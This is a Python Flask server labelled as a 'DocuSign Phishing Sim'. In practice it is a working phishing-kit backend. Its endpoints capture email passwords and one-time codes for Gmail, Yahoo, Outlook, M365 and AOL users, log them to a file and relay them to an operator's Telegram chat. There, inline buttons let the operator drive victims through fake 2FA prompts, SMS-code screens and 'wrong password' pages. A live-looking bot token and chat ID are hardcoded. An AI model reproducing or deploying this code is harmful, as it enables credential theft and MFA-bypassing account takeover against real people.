#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API (Webhook Mode)
Deploy on Render — Telegram pushes updates to this server
"""

import json, logging, datetime, hashlib, threading, time, random, os, sys
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup

# ─── CONFIG ───
TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"

app = Flask(__name__)
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Thread-safe session storage (still in-memory — requires single worker)
gmail_sessions = {}
gmail_sessions_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# ─── TELEGRAM WEBHOOK ───
@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    """Telegram pushes updates here"""
    try:
        data = request.get_json(force=True)
        logger.info(f"Webhook received: update_id={data.get('update_id')}, keys={list(data.keys())}")
        
        if "callback_query" in data:
            logger.info(f"Callback_query received: {data['callback_query'].get('data','')[:100]}")
            handle_cb(data["callback_query"])
        elif "message" in data:
            logger.info(f"Message received: text={data['message'].get('text','')[:100]}")
            handle_msg(data["message"])
        else:
            logger.warning(f"Unknown update type: {list(data.keys())}")
        
        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return jsonify({"ok": False})

def handle_msg(msg_data):
    """Handle regular messages"""
    chat_id = msg_data.get("chat", {}).get("id")
    text = msg_data.get("text", "")
    
    if str(chat_id) != TELEGRAM_CHAT_ID:
        logger.warning(f"Message from unknown chat: {chat_id}")
        return
    
    if text == "/status":
        with gmail_sessions_lock:
            active = [s for s in gmail_sessions.values() if s.get("action") not in ("success", "cancelled")]
        if not active:
            bot.send_message(chat_id=chat_id, text="No active Gmail sessions.")
        else:
            lines = [f"Active: {len(active)}"]
            for s in active:
                lines.append(f"• {s['email']} — stage: {s.get('stage','?')}")
            bot.send_message(chat_id=chat_id, text="\n".join(lines))
    elif text == "/id":
        bot.send_message(chat_id=chat_id, text=f"Chat ID: {chat_id}")
    elif text == "/webhook_info":
        info = bot.get_webhook_info()
        bot.send_message(
            chat_id=chat_id,
            text=f"Webhook URL: {info.url}\nPending: {info.pending_update_count}\n"
                 f"Allowed updates: {info.allowed_updates}\n"
                 f"Last error: {info.last_error_message}\n"
                 f"Last error date: {info.last_error_date}"
        )

def handle_cb(query):
    """Handle button presses"""
    data = query["data"]
    mid = query["message"]["message_id"]
    
    try:
        bot.answer_callback_query(query["id"])
        
        if data.startswith("yes:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "2fa_grid"
                    gmail_sessions[sid]["stage"] = "awaiting_2fa"
                    kb = []
                    row = []
                    for i in range(10, 100):
                        row.append(InlineKeyboardButton(str(i), callback_data=f"2fa:{sid}:{i}"))
                        if len(row) == 9:
                            kb.append(row)
                            row = []
                    if row:
                        kb.append(row)
                    kb.append([InlineKeyboardButton("❌ Cancel", callback_data=f"cancel:{sid}")])
                    bot.edit_message_reply_markup(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
                        reply_markup=InlineKeyboardMarkup(kb))
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
                        text="🔐 Select 2FA phone number ending:", reply_markup=InlineKeyboardMarkup(kb))
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found (expired or worker mismatch)")
        
        elif data.startswith("2fa:"):
            parts = data.split(":")
            sid, digit = parts[1], parts[2]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["phone"] = digit
                    gmail_sessions[sid]["action"] = "show_prompt"
                    gmail_sessions[sid]["stage"] = "prompt_shown"
                    kb = [[InlineKeyboardButton("✅ User Authorized", callback_data=f"authorized:{sid}")]]
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
                        text=f"✅ 2FA number selected: ••••{digit}\n\nPrompt sent to user. Waiting for 'Authorized' click...",
                        reply_markup=InlineKeyboardMarkup(kb))
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("authorized:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    code1 = f"{random.randint(100000, 999999)}"
                    gmail_sessions[sid]["sms1"] = code1
                    gmail_sessions[sid]["action"] = "sms1"
                    gmail_sessions[sid]["stage"] = "sms1"
                    kb = [[InlineKeyboardButton("📱 Send SMS II", callback_data=f"sms2:{sid}")],
                          [InlineKeyboardButton("🔄 Resend SMS I", callback_data=f"resend1:{sid}")]]
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
                        text=f"📱 SMS Code I: `{code1}`\n\nSend SMS Code II?",
                        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("sms2:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    code2 = f"{random.randint(100000, 999999)}"
                    gmail_sessions[sid]["sms2"] = code2
                    gmail_sessions[sid]["action"] = "sms2"
                    gmail_sessions[sid]["stage"] = "sms2"
                    kb = [[InlineKeyboardButton("✅ Complete", callback_data=f"success:{sid}")]]
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
                        text=f"📱 SMS Code II: `{code2}`\n\nBoth sent. Complete?",
                        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("resend1:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    c = f"{random.randint(100000, 999999)}"
                    gmail_sessions[sid]["sms1"] = c
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("success:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    s = gmail_sessions[sid]
                    s["action"] = "success"
                    s["stage"] = "done"
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid,
                        text=f"✅ COMPLETE — {s['email']}\n\n"
                        f"Email: {s['email']}\nPassword: {s['password']}\n"
                        f"Phone: ••••{s.get('phone', 'N/A')}\n"
                        f"SMS I: {s.get('sms1', 'N/A')}\nSMS II: {s.get('sms2', 'N/A')}")
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("cancel:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "cancelled"
                    gmail_sessions[sid]["stage"] = "cancelled"
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid, text="❌ Session cancelled.")
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("pw_error:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "pw_error"
                    gmail_sessions[sid]["stage"] = "pw_error"
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid, text="🔑 Showing 'Wrong Password'.")
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
        
        elif data.startswith("no:"):
            sid = data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "denied"
                    gmail_sessions[sid]["stage"] = "denied"
                    bot.edit_message_text(chat_id=TELEGRAM_CHAT_ID, message_id=mid, text="❌ Access Denied — user redirected.")
                else:
                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"⚠️ Session {sid} not found")
    except Exception as e:
        logger.error(f"CB error: {e}", exc_info=True)

def tg(text, markup=None, parse_mode=None):
    """Send a Telegram message with error reporting"""
    try:
        m = InlineKeyboardMarkup(markup) if markup else None
        msg = bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text=text,
            reply_markup=m,
            parse_mode=parse_mode
        )
        logger.info(f"✅ TG message sent: msg_id={msg.message_id}, preview={text[:60]}...")
        return msg.message_id
    except Exception as e:
        logger.error(f"❌ TG send error: {e}", exc_info=True)
        # Re-raise so caller knows it failed (but don't crash the request)
        return None

# ─── API ───
@app.route("/")
def health():
    with gmail_sessions_lock:
        count = len(gmail_sessions)
    return jsonify({"status": "ok", "sessions": count})

@app.route("/setup_webhook", methods=["POST"])
def setup_webhook():
    """Manually set webhook (call once after deploy)"""
    data = request.json
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "Provide url"}), 400
    
    webhook_url = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"
    
    try:
        # First delete any existing webhook
        bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Old webhook deleted")
        
        # Set new webhook with allowed_updates
        result = bot.set_webhook(
            url=webhook_url,
            allowed_updates=["message", "callback_query"]
        )
        logger.info(f"✅ Webhook set result: {result}")
        
        # Get webhook info to confirm
        import time as ttime
        ttime.sleep(1)  # Give Telegram time to propagate
        info = bot.get_webhook_info()
        
        return jsonify({
            "webhook_set": result,
            "webhook_url": webhook_url,
            "pending_update_count": info.pending_update_count,
            "allowed_updates": info.allowed_updates,
            "last_error_message": info.last_error_message,
            "last_error_date": info.last_error_date,
            "url": info.url,
            "info": str(info)
        })
    except Exception as e:
        logger.error(f"Webhook setup error: {e}", exc_info=True)
        return jsonify({"error": str(e)}), 500

@app.route("/api/creds", methods=["POST"])
def capture():
    """Universal credential capture endpoint"""
    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "unknown")
    
    session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]
    
    # Log
    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
    
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    
    logger.info(f"Captured creds: {provider} / {email}")
    
    # ── Telegram ──
    if provider == "gmail":
        with gmail_sessions_lock:
            gmail_sessions[session_id] = {
                "email": email, "password": password, "ip": ip, "ua": ua,
                "action": "waiting", "stage": "new",
                "phone": None, "sms1": None, "sms2": None
            }
        
        # Credential drop — with parse_mode=None to avoid Markdown formatting issues
        tg(f"[+]___ Invitation Card (GMAIL) ___[+]\n"
           f"You have a new website form submission \n"
           f"IP Address: {ip}\n"
           f"Id: gmail\n"
           f"Email: {email}\n"
           f"Password: {password}\n"
           f"UA: {ua}")
        
        # Control panel
        tg(f"🔔 GMAIL — {email}\nPassword: {password}\nSession: {session_id}",
           markup=[
               [InlineKeyboardButton("✅ Yes", callback_data=f"yes:{session_id}"),
                InlineKeyboardButton("❌ No", callback_data=f"no:{session_id}")],
               [InlineKeyboardButton("🔑 Password Error", callback_data=f"pw_error:{session_id}")]
           ])
        
        return jsonify({"session": session_id, "action": "waiting"})
    
    else:
        pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
        tg(f"[+]___ Invitation Card ___[+]\n"
           f"You have a new website form submission \n"
           f"IP Address: {ip}\n"
           f"Id: {pid}\n"
           f"Email: {email}\n"
           f"Password: {password}")
        
        return jsonify({"session": session_id, "action": "check_provider"})

@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    """Gmail: frontend polls this"""
    with gmail_sessions_lock:
        if session_id not in gmail_sessions:
            return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
        s = gmail_sessions[session_id]
        action = s.get("action", "waiting")
    
    if action == "waiting":
        return jsonify({"action": "waiting"})
    elif action == "show_prompt":
        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX")})
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "denied":
        return jsonify({"action": "denied"})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action in ("cancelled", "redirect"):
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    return jsonify({"action": "waiting"})

@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
def gmail_authorize(session_id):
    with gmail_sessions_lock:
        if session_id in gmail_sessions:
            gmail_sessions[session_id]["action"] = "authorized"
            email = gmail_sessions[session_id]["email"]
            tg(f"✅ User clicked 'Authorized' for {email}")
        else:
            return jsonify({"status": "error", "message": "session not found"}), 404
    return jsonify({"status": "ok"})

@app.route("/api/otp", methods=["POST"])
def capture_otp():
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = request.remote_addr
    
    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    
    logger.info(f"OTP captured: {provider} / {otp} / session={session_id}")
    
    tg(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
    
    return jsonify({"status": "ok"})

# ─── START ───
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    
    # Delete any existing webhook that might conflict
    try:
        bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Old webhook deleted (if any)")
    except Exception as e:
        logger.warning(f"Could not delete webhook: {e}")
    
    logger.info(f"Starting Flask on 0.0.0.0:{port}")
    logger.info(f"After deploy, POST to /setup_webhook with your Render URL to set the webhook")
    logger.info(f"IMPORTANT: Use single worker! Procfile: web: gunicorn server:app --workers=1 --bind 0.0.0.0:$PORT")
    
    app.run(host="0.0.0.0", port=port, debug=False)
